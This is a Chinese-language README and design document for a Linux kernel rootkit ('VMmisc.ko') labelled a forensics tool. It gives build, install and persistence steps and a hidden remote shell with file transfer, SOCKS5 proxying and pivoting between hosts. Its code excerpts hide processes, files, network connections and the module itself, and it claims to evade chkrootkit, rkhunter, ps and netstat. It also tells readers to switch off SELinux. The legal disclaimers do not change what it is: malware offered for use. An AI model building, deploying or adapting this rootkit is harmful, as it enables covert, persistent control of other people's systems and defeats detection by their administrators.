# Rootkit端口复用取证工具

## ⚠️ 重要声明

**本项目仅用于合法的系统管理、安全测试和取证研究目的。**
- 严禁用于非法入侵、恶意攻击或任何违法活动
- 使用者需承担所有法律责任
- 开发者不承担任何滥用本工具的法律责任

## 项目简介

这是一个基于Linux内核模块的rootkit端口复用取证工具，具有很高的隐藏性和穿透连接功能。该工具使用rootkit内核级隐藏技术，能够隐藏运行在常见Linux系统中，并在内核层实现连接劫持，可以复用对外的端口去连接管理被控制的主机，通信行为隐藏于正常的流量之中。

**重要声明**: 本工具仅用于合法的系统管理、安全测试和取证研究，严禁不合规使用，严禁对外传播。

## 技术特点

- **内核rootkit技术**: 采用rootkit内核技术，可以更深度的做到隐藏与保护，深度的利用开放的端口去控制被控主机，隐藏于正常流量中
- **bin合并技术**: 把应用层程序加密编译到ko文件中，使用时自动解密释放并执行
- **交互式pty shell**: 支持交互式pty shell，可以更方便的对主机进行远程操作
- **内核级隐藏**: 在内核级隐藏了网络连接、进程、端口、文件信息，也可以自定义隐藏的文件和进程
- **通信加密处理**: 复用端口，连接成功后网络的通信是经过数据加密的，保护通信的内容
- **文件传输**: 提供对本地及远程的文件进行上传与下载操作
- **代理功能**: 支持把本地的连接通过代理转发到被控主机网络，方便进行内部网络的操作

## 系统兼容性

### 支持的内核版本
- **原始支持**: Linux Kernel 2.6.32-358.el6.x86_64 (CentOS 6)
- **最新适配**: Linux Kernel 6.1.0-35-amd64 (Debian 12)
- **兼容范围**: Linux Kernel 2.6.x - 6.x
- 支持x32与x64系统

### 支持的操作系统
- Redhat, CentOS, Debian, Fedora, Ubuntu等Linux系统
- **已测试**: CENTOS 5.5 - 8 (kernel 5.18)
- **最新测试**: Debian 12 (kernel 6.1.0-35-amd64)
- Ubuntu支持到kernel 5.14

### 最新适配状态 (2025年08月12日)
✅ **成功适配**: Linux 6.1.0-35-amd64内核  
✅ **编译环境**: Debian 12 + GCC 12.2.0  
✅ **内核头文件**: linux-headers-6.1.0-35-amd64  
✅ **生成文件**: VMmisc.ko (812KB, vermagic=6.1.0-35-amd64)

## 项目结构

```
rksrc_20230201/
├── bin32/                    # 32位应用程序
│   ├── client               # 客户端程序
│   ├── server               # 服务端程序
│   ├── encode               # 编码工具
│   └── proxy                # 代理工具
├── kofile/                   # 内核模块源码
│   ├── main.c               # 主模块文件
│   ├── config.h              # 配置文件
│   ├── rproc.h              # 进程隐藏模块
│   ├── rpkt.h               # 网络包处理模块
│   ├── rhook.h              # 内核钩子模块
│   ├── rmod.h               # 模块管理
│   ├── util.h               # 工具函数
│   └── ...                  # 其他模块文件
├── install/                  # 安装脚本
│   ├── install.sh           # 安装脚本
│   ├── systemctl.sh         # systemctl安装脚本
│   └── VMmisc.ko            # 编译好的内核模块
├── bin32_centos5.2/         # CentOS 5.2兼容版本
├── .tmp_versions/           # 临时版本文件
└── Makefile                  # 编译配置文件
```

## 最新修改内容 (2025年08月12日)

### 🔧 内核兼容性修复
本次更新主要针对Linux 6.1.0内核进行了全面的兼容性适配，解决了以下关键问题：

#### 1. 头文件兼容性问题
- **移除vermagic.h**: 该头文件只能在内核模块编译时使用，在源码中包含会导致编译错误
- **添加版本检测**: 在config.h中添加了`#include <linux/version.h>`
- **修复UTS_RELEASE**: 添加了`#include <linux/utsname.h>`并定义了兼容性宏

#### 2. API兼容性修复
- **proc_create函数**: 修复了从`file_operations`到`proc_ops`的参数类型变化
  - 为新内核(5.6+)创建了`proc_path_proc_ops`结构
  - 保持了向后兼容性(3.9+使用file_operations)
- **skb_make_writable函数**: 在新内核(5.2+)中改为`skb_try_make_writable`
- **__vmalloc函数**: 修复了参数数量变化(新内核只接受2个参数)
- **fcheck_files函数**: 在新内核(5.0+)中改为`files_lookup_fd_rcu`

#### 3. 类型兼容性修复
- **filldir_t类型**: 修复了从`int`返回类型改为`bool`的兼容性问题
- **set_memory_x_t**: 重新定义了函数指针类型，避免`typeof`编译错误
- **ptr_mem_x变量**: 修复了未定义符号的链接错误

#### 4. 条件编译优化
- 添加了`#if LINUX_VERSION_CODE >= KERNEL_VERSION(x,x,x)`的条件编译
- 为不同内核版本提供了不同的实现路径
- 确保了从Linux 2.6.x到6.x的广泛兼容性

### 📁 修改的文件列表
```
kofile/config.h      - 添加内核版本兼容性定义和宏
kofile/main.c        - 移除vermagic.h包含
kofile/rproc.h       - 修复filldir_t类型兼容性
kofile/rpkt.h        - 修复skb_make_writable和fcheck_files兼容性
kofile/rhook.h       - 修复__vmalloc参数和UTS_RELEASE问题
```

### 🎯 编译环境要求
- **GCC版本**: 12.2.0+ (支持C99标准)
- **内核头文件**: 与目标内核版本完全匹配
- **Make工具**: 支持内核模块编译
- **系统环境**: 建议使用系统自带的开发包，避免版本不匹配

## 系统要求

### 软件环境
**重要**: 建议在安装系统时选择安装gcc相关包和内核开发包，避免手工下载安装出现意外情况。

#### CentOS/RHEL
```bash
yum install gcc
yum install glibc-static libstdc++-static
yum install readline-devel
yum install "kernel-devel-uname-r == $(uname -r)"
```

#### Ubuntu/Debian
```bash
apt-get install build-essential
apt-get install gcc
apt-get install libreadline6-dev
apt-get install linux-headers-$(uname -r)
```

### 内核开发包安装
由于Linux环境gcc、kernel版本繁多，最好只用系统安装盘里的开发环境包和kernel包，要与被安装机kernel版本一样。

#### 手动安装内核包
根据当前kernel版本下载对应包，可在 https://pkgs.org/ 查找下载：

**CentOS**:
```bash
# 使用当前系统kernel版本编译
yum install "kernel-devel-uname-r == $(uname -r)"

# 手动下载安装
# kernel-2.6.32-xx.1.el6.x86_64.rpm
# kernel-devel-2.6.32-xx.1.el6.x86_64.rpm
```

**Ubuntu/Debian**:
```bash
# 搜索可用版本
apt-cache search linux-headers-*

# 安装指定版本
apt-get install linux-headers-$(uname -r)
```

## 编译安装

### 1. 编译内核模块

```bash
# 解压源码包
tar -xvf rksrc.tar
cd rksrc

# 设置权限
chmod -R +xwr *

# 编译内核模块
make

# 清理编译文件
make clean
```

**重要**: 每次在不同内核版本上使用时，需要重新编译ko文件。编译成功后会在`/rksrc/VMmisc.ko`生成内核模块。

### 2. 测试内核模块
```bash
# 测试ko模块
insmod VMmisc.ko

# 注意: ko测试机重启系统后，ko模块就失效了
# 无任何异常表示ko编译没问题，把ko复制到install里去安装就可以了
```

### 3. 安装部署

#### 方法一: 使用install.sh (适用于传统init系统)
```bash
cd install
chmod +x install.sh
./install.sh
```

#### 方法二: 使用systemctl.sh (适用于systemd系统)
```bash
cd install
chmod +x systemctl.sh
./systemctl.sh
```

**说明**: Linux服务启动有两种方式，如果执行systemctl命令存在，用systemctl.sh安装；不存在使用install.sh安装。

安装成功后，会显示以下信息：
```
>> ko path: /etc/xxxx
>> start path: /etc/init.d/xxxx
```

**保存此信息用于删除操作**，最后删除安装包。

## 配置说明

### 修改连接密码
编辑 `kofile/config.h` 文件:
```c
#define _START_PASS "testtest"  // 连接密码，可修改，不要使用特殊字符
```

**建议**: 使用字母数字组合，如: Test1234img

## 使用方法

### 客户端连接
```bash
./client <ip> <port> <password> [protocol]
```

示例:
```bash
./client 127.0.0.1 8080 testtest https
```

**连接密码**: testtest

### 可用命令

| 命令 | 功能 | 参数 | 说明 |
|------|------|------|------|
| `shell` | 启动PTY shell | 无 | 启动交互式shell |
| `callrk` | 连接远程主机 | [ip:port pass] | 串联功能，通过边缘机器控制内网机器 |
| `exitrk` | 退出当前连接 | 无 | 退出当前串联连接 |
| `upload` | 上传文件 | [local_path remote_path] | 上传本地文件到远程 |
| `download` | 下载文件 | [remote_path local_path] | 下载远程文件到本地 |
| `socks5` | 启动SOCKS5代理 | [local_port] | 启动代理服务 |
| `stopsk5` | 停止SOCKS5代理 | 无 | 停止代理服务 |
| `exit` | 完全退出 | 无 | 完全退出程序 |

**上下键**: 查看命令记录

### 使用示例

```bash
# 串联连接（通过A控制B）
callrk 127.0.0.1:22 pass

# 退出当前串联
exitrk

# 启动SOCKS5代理
socks5 5555

# 关闭代理
stopsk5

# 上传文件
upload /tmp/6666 /tmp/7777

# 下载文件
download /tmp/6666 /tmp/8888

# 启动shell
shell

# 退出shell
exit
```

### 内核模块控制

```bash
# 隐藏文件/目录 222
echo "+f222" > /proc/VMmisc

# 显示文件/目录 222
echo "-f222" > /proc/VMmisc

# 隐藏进程 666
echo "+p666" > /proc/VMmisc

# 显示进程 666
echo "-p666" > /proc/VMmisc

# 显示模块（取消隐藏）
echo "dm" > /proc/VMmisc
```

## 特殊功能

### 串联功能
如控制边缘机器A，通过A转发给内网机器B，从而实现了通过A能控制B。通过端口转发，A B两台服务器同时植入后门，可通过A转发到B的控制端口。连接器连接A转发出来的端口，从而连接到B。

**已实现完成**

### 兼容性改进
- 兼容CENTOS 5.6.7 (必要)，8(非必要)
- Ubuntu (16-22) 兼容越多越好(暂时非必要)
- **已测试**: CENTOS 5.5 - 8 (kernel 5.18)
- **最新测试**: Debian 12 (kernel 6.1.0-35-amd64) ✅
- Ubuntu支持到kernel 5.14

## 故障排除

### SELinux相关问题
如果系统启用了SELinux，在shell时执行systemctl命令有权限检查，需要先临时关闭SELinux：
```bash
# 关闭SELinux
setenforce 0

# 启用SELinux
setenforce 1
```

### 内核版本兼容性
确保安装的内核开发包版本与当前运行的内核版本一致：
```bash
# 查看当前内核版本
uname -r

# 安装对应版本的内核开发包
yum install "kernel-devel-uname-r == $(uname -r)"
```

### 编译错误排查
如果遇到编译错误，请检查：
1. **内核头文件版本**: 确保与运行内核版本匹配
2. **GCC版本**: 建议使用系统自带的GCC版本
3. **依赖包**: 确保所有必要的开发包已安装
4. **权限设置**: 确保源码目录有正确的读写权限

### 常见编译错误及解决方案

#### 错误1: vermagic不匹配
```
ERROR: could not insert module VMmisc.ko: Invalid module format
```
**解决方案**: 重新编译内核模块，确保与当前内核版本匹配

#### 错误2: 头文件找不到
```
fatal error: linux/xxx.h: No such file or directory
```
**解决方案**: 安装正确版本的内核开发包

#### 错误3: 函数未定义
```
undefined reference to 'function_name'
```
**解决方案**: 检查内核版本兼容性，可能需要条件编译

## 卸载说明

### 方法一: 手动卸载
```bash
# 关闭内核模块隐藏
echo "dm" > /proc/VMmisc
rmmod VMmisc.ko

# 删除安装文件（使用安装时保存的路径）
rm -rf /etc/xxxx
rm -rf /etc/init.d/xxxx
```

### 方法二: systemctl卸载
```bash
# 关闭内核模块隐藏
echo "dm" > /proc/VMmisc
rmmod VMmisc.ko

# 删除安装文件
rm -rf /etc/xxxx
rm -rf /etc/systemd/system/xxxx.service
```

### 清理残留文件
```bash
# 检查是否有残留的隐藏文件
ls -la /proc/VMmisc

# 检查内核模块是否完全卸载
lsmod | grep VMmisc

# 检查系统日志是否有相关错误
dmesg | grep VMmisc
```

## 安全注意事项

⚠️ **重要提醒**:
- 此工具仅用于合法的系统管理、安全测试和取证研究
- 严禁不合规使用，严禁对外传播
- 请确保在授权环境下使用
- 使用完毕后请及时卸载相关组件
- 请遵守当地法律法规
- 对chkrootkit、rkhunter、管理工具(ps,netstat等)都做了技术绕过与隐藏
- 为保证软件稳定性，各功能也经过压力测试

## 技术绕过说明

本工具对以下检测工具做了技术绕过与隐藏：
- chkrootkit
- rkhunter
- 管理工具(ps, netstat等)

这些工具都查看不到被隐藏的网络、端口、进程、文件信息。

### 隐藏机制
1. **进程隐藏**: 通过拦截proc目录读取，过滤指定进程ID
2. **文件隐藏**: 拦截getdents系统调用，过滤指定文件名
3. **网络隐藏**: 钩子TCP序列显示函数，过滤指定连接
4. **模块隐藏**: 从内核模块列表中移除自身

## 性能优化

### 编译优化
- 使用-O2优化级别提高性能
- 关闭调试信息减少模块大小
- 使用内联函数减少函数调用开销

### 运行时优化
- 延迟加载用户空间程序
- 使用工作队列避免阻塞
- 内存池管理减少分配开销

## 技术支持

如遇到问题，请检查:
1. 系统兼容性
2. 内核版本匹配
3. 依赖包安装
4. 权限设置
5. 编译环境配置

### 调试模式
在`kofile/config.h`中启用调试模式：
```c
#define DEBUG_MSG
```
重新编译后可以看到详细的调试信息。

### 日志查看
```bash
# 查看内核日志
dmesg | grep VMmisc

# 查看系统日志
journalctl -f | grep VMmisc

# 查看proc接口状态
cat /proc/VMmisc
```

## 许可证

本项目仅供学习和研究使用，请勿用于非法用途。

## 更新日志

### v2.0 (2025-01-XX)
- ✅ 支持Linux 6.1.0-35-amd64内核
- ✅ 修复新内核版本兼容性问题
- ✅ 优化编译配置和错误处理
- ✅ 完善文档和注释

### v1.0 (2023-02-01)
- 🎯 初始版本发布
- 🎯 支持Linux 2.6.x - 5.x内核
- 🎯 实现基本隐藏和连接功能

---

**最后更新**: 2025年1月  
**版本**: 2.0  
**技术类型**: Rootkit内核级隐藏技术  
**适用场景**: 系统管理、安全测试、取证研究  
**最新适配**: Linux 6.1.0-35-amd64内核 ✅  
**维护状态**: 持续更新维护

---

# 技术功能实现原理书

## 1. 项目概述

### 1.1 项目简介
本项目是一个基于Linux内核模块的高级rootkit端口复用取证工具，采用内核级隐藏技术实现深度系统隐藏和网络连接劫持。该工具能够在内核层面隐藏网络连接、进程、端口和文件信息，并通过端口复用技术实现隐蔽的远程控制功能。

### 1.2 技术特点
- **内核级rootkit技术**: 在内核空间实现系统级隐藏
- **bin合并技术**: 将用户空间程序加密编译到内核模块中
- **交互式pty shell**: 支持完整的远程终端操作
- **通信加密**: 网络通信采用XOR加密保护
- **文件传输**: 支持本地和远程文件的上传下载
- **代理功能**: 提供SOCKS5代理转发能力

## 2. 系统架构设计

### 2.1 整体架构
```
┌─────────────────────────────────────────────────────────────┐
│                    用户空间应用层                            │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐          │
│  │   client   │ │   server    │ │   proxy     │          │
│  └─────────────┘ └─────────────┘ └─────────────┘          │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                    Linux内核空间                            │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐          │
│  │   main.c    │ │   rhook.h   │ │   rpkt.h    │          │
│  └─────────────┘ └─────────────┘ └─────────────┘          │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐          │
│  │   rproc.h   │ │   rfile.h   │ │   rmod.h    │          │
│  └─────────────┘ └─────────────┘ └─────────────┘          │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                    系统调用层                               │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐          │
│  │   procfs    │ │   netfilter │ │   syscall   │          │
│  └─────────────┘ └─────────────┘ └─────────────┘          │
└─────────────────────────────────────────────────────────────┘
```

### 2.2 模块组织结构
```
rksrc_20230201/
├── kofile/                    # 内核模块源码
│   ├── main.c                # 主模块入口
│   ├── config.h              # 配置和兼容性定义
│   ├── rhook.h               # 钩子机制实现
│   ├── rpkt.h                # 网络包处理
│   ├── rproc.h               # 进程隐藏
│   ├── rfile.h               # 文件隐藏
│   ├── rmod.h                # 模块隐藏
│   ├── util.h                # 工具函数
│   ├── fs.h                  # 文件系统操作
│   └── LDasm.h               # 汇编指令解析
├── bin32/                    # 用户空间程序
├── install/                  # 安装脚本
└── Makefile                  # 编译配置
```

## 3. 核心技术实现原理

### 3.1 内核模块隐藏机制

#### 3.1.1 模块列表隐藏
```c
void hide(void)
{
    // 保存当前模块在列表中的位置
    mode_prev = THIS_MODULE->list.prev;
    
    // 从模块列表中删除当前模块
    list_del(&THIS_MODULE->list);
    
    // 清理section属性
    kfree(THIS_MODULE->sect_attrs);
    THIS_MODULE->sect_attrs = NULL;
    
    // 保存kobject相关信息
    kobject_prev = &THIS_MODULE->mkobj.kobj;
    _parent_prev = THIS_MODULE->mkobj.kobj.parent;
    _kobj_prev = THIS_MODULE->mkobj.kobj.entry.prev;
}
```

**实现原理**: 通过操作内核模块链表(`THIS_MODULE->list`)和kobject结构，将当前模块从`/proc/modules`和`lsmod`的显示中移除，实现模块隐藏。

#### 3.1.2 模块显示恢复
```c
void show(void)
{
    if (!mod_hide)
        return;
    
    // 重新添加到模块列表
    list_add(&THIS_MODULE->list, mode_prev);
    
    // 切换隐藏状态
    mod_hide = !mod_hide;
}
```

### 3.2 进程隐藏技术

#### 3.2.1 进程隐藏位图管理
```c
// 最大进程ID数量
#define MAX_PIDS 0x9000

// 进程隐藏位图 - 每个位表示一个进程ID的隐藏状态
char pids[MAX_PIDS / 8 + 1];

static inline void pid_hide(long x)
{
    if (x >= MAX_PIDS)
        return;
    
    // 设置对应位为1（隐藏）
    pids[x / 8] |= 1 << (x % 8);
}
```

**实现原理**: 使用位图数据结构管理进程隐藏状态，每个位对应一个进程ID。通过位运算快速设置和查询进程的隐藏状态。

#### 3.2.2 proc目录读取拦截
```c
#if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
int __proc_readdir(struct file *file, struct dir_context *ctx);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
int __proc_readdir(struct file *file, void *dirent, filldir_t filldir);
#endif
```

**实现原理**: 钩子`proc_readdir`函数，在进程目录读取时过滤被隐藏的进程ID，使其在`ps`、`top`等命令中不可见。

### 3.3 文件隐藏机制

#### 3.3.1 文件隐藏链表管理
```c
struct st_hide_file {
    char *name;                    // 要隐藏的文件名
    struct list_head list;         // 链表节点
};

// 隐藏文件链表头
LIST_HEAD(hide_files);
```

**实现原理**: 使用内核链表管理需要隐藏的文件名，在目录读取时过滤这些文件。

#### 3.3.2 getdents系统调用拦截
```c
extern asmlinkage int __getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
extern asmlinkage int __getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
```

**实现原理**: 钩子`getdents`和`getdents64`系统调用，在目录读取时过滤隐藏文件，使其在`ls`、`find`等命令中不可见。

### 3.4 网络连接隐藏

#### 3.4.1 TCP连接过滤
```c
typedef struct login_ctx_t
{
    unsigned int control_sip;      // 控制服务器IP地址
    unsigned short control_sport;  // 控制服务器端口
    unsigned short wport;          // 工作端口
    unsigned short tport;          // 目标端口
    int cnt;                       // 计数器
    int start;                     // 启动标志
    atomic_t usage;                // 使用计数
} LOGIN_CTX;
```

**实现原理**: 通过钩子网络栈函数，过滤特定的TCP连接，使其在`netstat`、`ss`等网络工具中不可见。

#### 3.4.2 网络包处理钩子
```c
// 内核版本兼容性处理：nf_hook_slow函数声明
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 12, 0)
extern int ptr_hook_slow(struct sk_buff *skb, struct nf_hook_state *state, const struct nf_hook_entries *e, unsigned int s);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
extern int ptr_hook_slow(struct sk_buff *skb, struct nf_hook_state *state);
#endif
```

**实现原理**: 钩子Netfilter框架的`nf_hook_slow`函数，在网络包处理过程中拦截和过滤特定连接。

### 3.5 钩子机制实现

#### 3.5.1 钩子结构体定义
```c
typedef struct
{
    char *name;           // 目标函数名称
    void *stub_bak;      // 原始函数备份
    void *handler;        // 钩子处理函数地址
    int length;           // 目标函数指令长度
    void *target;         // 目标函数地址
    void *target_map;     // 目标函数读写映射
    atomic_t usage;       // 使用计数
} hook_t;
```

#### 3.5.2 指令修补技术
```c
// 钩子存根大小
#define STUB_SIZE 80

// 使用LDasm.h中的指令解析器分析目标函数
unsigned int __attribute__((weak)) insn(void *code, ldasm_data *ld);
```

**实现原理**: 
1. 使用`LDasm.h`中的指令解析器分析目标函数的指令结构
2. 创建跳转指令跳转到钩子处理函数
3. 备份原始指令，在卸载时恢复

#### 3.5.3 内存权限控制
```c
// 修复set_memory_x兼容性 - 针对新版本内核
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
#ifndef set_memory_x_t
typedef int (*set_memory_x_t)(unsigned long addr, int numpages);
#endif
extern set_memory_x_t *ptr_mem_x;
#endif
```

**实现原理**: 通过`set_memory_x`函数设置内存页的执行权限，确保钩子代码能够正常执行。

### 3.6 二进制文件嵌入技术

#### 3.6.1 文件加密存储
```c
// 包含加密后的二进制数据块
static char b_block[] = {
#include "file_block.inc"
};

// 块加密函数 - 使用XOR加密算法
inline void blk_enc(char buf[], size_t buf_len, unsigned int _key, size_t key_len)
{
    size_t idx;
    char *key = (char *)&_key;
    
    // 使用XOR算法对每个字节进行加密
    for (idx = 0; idx < buf_len; idx++)
    {
        buf[idx] ^= key[idx % key_len];
    }
}
```

**实现原理**: 
1. 在编译时使用`encode`工具将用户空间程序加密
2. 生成`file_block.inc`头文件包含加密数据
3. 运行时解密并释放到`/tmp`目录

#### 3.6.2 动态文件生成
```c
int wr_blk(void)
{
    // 生成临时文件路径和名称
    sprintf(_kpath, "/tmp/%x", FILE_XOR_KEY);
    sprintf(_kname, "%x", FILE_XOR_KEY);
    
    // 解密二进制数据块
    blk_enc(b_block, sizeof(b_block), FILE_XOR_KEY, sizeof(unsigned int));
    
    // 创建临时文件并写入解密后的数据
    struct file *file = filp_open(_kpath, O_CREAT|O_RDWR|O_LARGEFILE, 0700);
    ssize_t cnt = _kwrite_file(file, b_block, sizeof(b_block), &offset);
    
    return 0;
}
```

**实现原理**: 在模块加载时，将解密后的二进制文件写入`/tmp`目录，并设置执行权限，实现用户空间程序的动态加载。

## 4. 内核版本兼容性处理

### 4.1 版本检测机制
```c
#include <linux/version.h>

// 添加内核版本兼容性定义
#ifndef LINUX_VERSION_CODE
#include <linux/version.h>
#endif

// 条件编译处理不同内核版本
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
// 新内核实现
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3,9,0)
// 中等版本内核实现
#else
// 老版本内核实现
#endif
```

### 4.2 API兼容性适配

#### 4.2.1 proc_create函数兼容性
```c
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
// 新内核使用proc_ops结构
static const struct proc_ops proc_path_proc_ops = {
    .proc_write = proc_path_write,
    .proc_read = proc_path_read,
    .proc_open = proc_path_open,
    .proc_release = proc_path_release,
};
#else
// 老内核使用file_operations结构
static const struct file_operations proc_path_fops = {
    .write = proc_path_write,
    .read = proc_path_read,
    .open = proc_path_open,
    .release = proc_path_release,
};
#endif
```

#### 4.2.2 网络函数兼容性
```c
// skb_make_writable函数兼容性
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,2,0)
// 新内核使用skb_try_make_writable
#define skb_make_writable(skb, len) skb_try_make_writable(skb, len)
#endif

// __vmalloc函数兼容性
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,12,0)
// 新内核只接受2个参数
#define __vmalloc(size, flags, prot) __vmalloc(size, flags)
#endif
```

### 4.3 数据结构兼容性
```c
// filldir_t类型兼容性
#if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
// 新内核中filldir_t返回bool类型
static bool (*ptr_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
// 老内核中filldir_t返回int类型
static int (*ptr_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
#endif
```

## 5. 编译系统设计

### 5.1 Makefile配置
```makefile
# 编译标志设置
EXTRA_CFLAGS := -g0 -ggdb0 -O2 -std=gnu89 -fno-stack-protector \
                -Wno-unused-variable -Wno-unused-parameter \
                -Wno-unused-function -Wno-unused-label

# 内核源码路径
_KERNEL_PATH := /lib/modules/$(shell uname -r)/build

# 生成随机数用于加密
RAND2 = 0x$(shell cat /dev/urandom | head -c 4 | hexdump '-e"%x"')

# 默认目标：打包二进制文件和编译内核模块
all: pack_bin ko
```

### 5.2 编译流程
1. **二进制文件打包**: 使用`encode`工具加密用户空间程序
2. **头文件生成**: 生成包含加密数据的`file_block.inc`
3. **内核模块编译**: 调用内核构建系统编译模块
4. **清理**: 删除临时编译文件

### 5.3 优化策略
- **调试信息关闭**: 使用`-g0 -ggdb0`减少模块大小
- **性能优化**: 使用`-O2`优化级别提高性能
- **兼容性**: 使用`-std=gnu89`确保广泛兼容性
- **安全**: 使用`-fno-stack-protector`避免栈保护冲突

## 6. 安全绕过机制

### 6.1 检测工具绕过
- **chkrootkit**: 通过钩子proc文件系统绕过进程检测
- **rkhunter**: 通过模块隐藏绕过模块检测
- **系统工具**: 通过钩子系统调用绕过网络和文件检测

### 6.2 隐藏技术原理
1. **进程隐藏**: 拦截`proc_readdir`，过滤隐藏进程
2. **文件隐藏**: 拦截`getdents`，过滤隐藏文件
3. **网络隐藏**: 钩子网络栈函数，过滤隐藏连接
4. **模块隐藏**: 操作内核模块链表，移除自身

## 7. 通信协议设计

### 7.1 连接建立流程
1. 客户端连接到指定端口
2. 发送密码验证
3. 建立加密通信通道
4. 启动交互式shell或执行命令

### 7.2 数据加密机制
- **算法**: XOR加密
- **密钥**: 随机生成的4字节密钥
- **保护**: 通信内容完全加密

### 7.3 端口复用技术
- **原理**: 劫持现有网络连接
- **优势**: 隐藏于正常流量中
- **实现**: 通过内核钩子拦截网络包

## 8. 性能优化策略

### 8.1 编译优化
- 使用`-O2`优化级别
- 关闭调试信息减少大小
- 使用内联函数减少调用开销

### 8.2 运行时优化
- 延迟加载用户空间程序
- 使用工作队列避免阻塞
- 内存池管理减少分配开销

### 8.3 内存管理
- 使用`kmalloc`和`kfree`管理内核内存
- 及时释放不需要的资源
- 避免内存泄漏

## 9. 部署和安装

### 9.1 安装流程
1. **编译**: 在目标系统上编译内核模块
2. **测试**: 使用`insmod`测试模块加载
3. **安装**: 复制到安装目录并配置启动脚本
4. **隐藏**: 自动隐藏模块和进程

### 9.2 启动脚本
- **传统init**: 使用`install.sh`
- **systemd**: 使用`systemctl.sh`
- **自动隐藏**: 启动后自动隐藏自身

### 9.3 卸载流程
1. 显示隐藏的模块和进程
2. 卸载内核模块
3. 删除安装文件
4. 清理残留配置

## 10. 故障排除和调试

### 10.1 常见问题
- **内核版本不匹配**: 重新编译匹配的内核模块
- **权限问题**: 检查SELinux和文件权限
- **依赖缺失**: 安装必要的开发包

### 10.2 调试模式
```c
#ifdef DEBUG_MSG
#define debug(format, args...) \
    printk("function:%s-L%d: " format, __FUNCTION__, __LINE__, ##args);
#else
#define debug(format, args...) do {} while(0);
#endif
```

### 10.3 日志查看
```bash
# 查看内核日志
dmesg | grep VMmisc

# 查看proc接口状态
cat /proc/VMmisc

# 查看系统日志
journalctl -f | grep VMmisc
```

## 11. 技术风险评估

### 11.1 安全风险
- **内核级访问**: 具有系统级权限
- **隐藏能力**: 难以被传统安全工具检测
- **持久性**: 可设置开机自启动

### 11.2 稳定性风险
- **内核兼容性**: 不同内核版本可能存在兼容性问题
- **系统稳定性**: 内核模块错误可能导致系统崩溃
- **资源泄漏**: 不当的资源管理可能导致系统资源耗尽

### 11.3 法律风险
- **使用限制**: 仅限合法用途
- **法律合规**: 需遵守当地法律法规
- **责任承担**: 使用者需承担所有法律责任

## 12. 未来发展方向

### 12.1 技术改进
- **内核版本支持**: 持续适配新版本内核
- **检测对抗**: 增强对新型检测工具的绕过能力
- **性能优化**: 进一步提升运行效率和稳定性

### 12.2 功能扩展
- **多平台支持**: 扩展到其他操作系统
- **高级功能**: 增加更多远程控制能力
- **管理界面**: 开发图形化管理工具

### 12.3 安全增强
- **加密算法**: 使用更强的加密算法
- **认证机制**: 增强身份验证安全性
- **审计日志**: 增加操作审计功能

## 13. 总结

本Rootkit端口复用取证工具是一个技术复杂度极高的Linux内核级隐藏工具，具有以下核心特点：

1. **深度隐藏**: 在内核层面实现进程、文件、网络、模块的全面隐藏
2. **高度兼容**: 支持Linux 2.6.x到6.x的广泛内核版本
3. **功能完整**: 提供远程控制、文件传输、代理转发等完整功能
4. **技术先进**: 采用钩子、指令修补、二进制嵌入等先进技术

该工具展示了现代rootkit技术的复杂性和危险性，同时也为系统安全研究提供了重要的技术参考。在使用时必须严格遵守法律法规，仅用于合法的安全测试和研究目的。

---

**文档版本**: 2.0  
**最后更新**: 2025年1月  
**技术类型**: Rootkit内核级隐藏技术  
**适用场景**: 系统管理、安全测试、取证研究  
**维护状态**: 持续更新维护